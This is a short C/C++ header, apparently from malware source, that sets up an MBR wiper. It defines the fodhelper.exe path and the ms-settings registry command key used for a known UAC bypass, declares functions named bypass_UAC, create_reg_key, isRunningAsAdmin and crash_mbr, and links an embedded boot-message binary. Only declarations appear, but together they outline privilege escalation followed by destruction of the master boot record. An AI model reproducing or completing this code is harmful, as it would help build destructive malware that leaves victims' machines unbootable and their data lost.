#ifndef _MBR_HPP_
# define _MBR_HPP_

#define MBR_SIZE 512

#define CMD "C:\\Windows\\System32\\cmd.exe"
#define FODHELPER "C:\\Windows\\System32\\fodhelper.exe"
#define REG_PATH "Software\\Classes\\ms-settings\\shell\\open\\command"
#define DELEGATE_EXECUTE "DelegateExecute"

#define SUCCESS 0
#define FAILURE -1

extern char    		_binary_BootMessage_bin_start[];                 
extern char    		_binary_BootMessage_bin_end[];

int			bypass_UAC(void);
int			create_reg_key(const char *name, const char *data);
BOOL			isRunningAsAdmin(void);
void			crash_mbr(void);

#endif /* !_MBR_HPP_ */
